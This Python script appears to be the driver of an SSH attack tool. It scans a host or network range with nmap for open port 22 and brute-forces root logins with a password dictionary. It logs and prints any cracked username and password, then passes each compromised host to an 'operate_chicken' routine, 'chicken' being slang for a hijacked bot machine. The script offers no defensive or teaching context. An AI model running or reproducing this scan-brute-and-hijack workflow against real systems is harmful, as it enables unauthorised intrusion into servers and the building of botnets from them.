#!/usr/bin/env python3
# coding=utf-8
__author__ = "riverchu"

import time
import optparse

from operate import *
from scan.nmapscan import *

MAX_CONNECTIONS = 10
OPERATE_INTERVAL = 3


def start_chu_brute(brute_type, host, user, dictionary, *, thread_num=MAX_CONNECTIONS):
    if brute_type is 'ssh':
        global chicken_info_file
        chicken_info_file = host.replace('/', 'mask') + '.txt'
        print('[+] Start scan host '+host)
        ssh_scan = RiverNmapScan()
        for open_host_info in ssh_scan.scan_async(host, 22, 'ssh'):
            print('[*] Start brute ', open_host_info['ip'])
            brute_ret = brute(open_host_info['ip'], user, dictionary, connections=thread_num)
            with open(CHICKEN_PATH+'scan.log', 'a') as logfile:
                json.dump(brute_ret, logfile)
                logfile.write('\n')
            if brute_ret['key'] is None:
                continue
            print('[+] Brute '+open_host_info['ip']+' result:',
                  'user: '+brute_ret['user'],
                  'password: '+brute_ret['key'])
            time.sleep(OPERATE_INTERVAL)
            operate_chicken(brute_ret)
        print('[+] End scan and brute.')


def main(host, user, dictionary, *, thread_num=MAX_CONNECTIONS):
    # 需增加排除ip功能
    print('[+] Test ssh scan and brute.')
    start_chu_brute('ssh', host, user, dictionary, thread_num=thread_num)


if __name__ == "__main__":
    host = '10.108.36.71'
    user = 'root'
    main(host, user, SSH_DICTIONARY)
    # file_info = read_file()
    # for info in file_info:
    #     print(info)
    #     if file_info[info]['key'] == 'None':
    #         continue
    #     # operate_chicken(file_info[info])
    #     print(file_info[info])
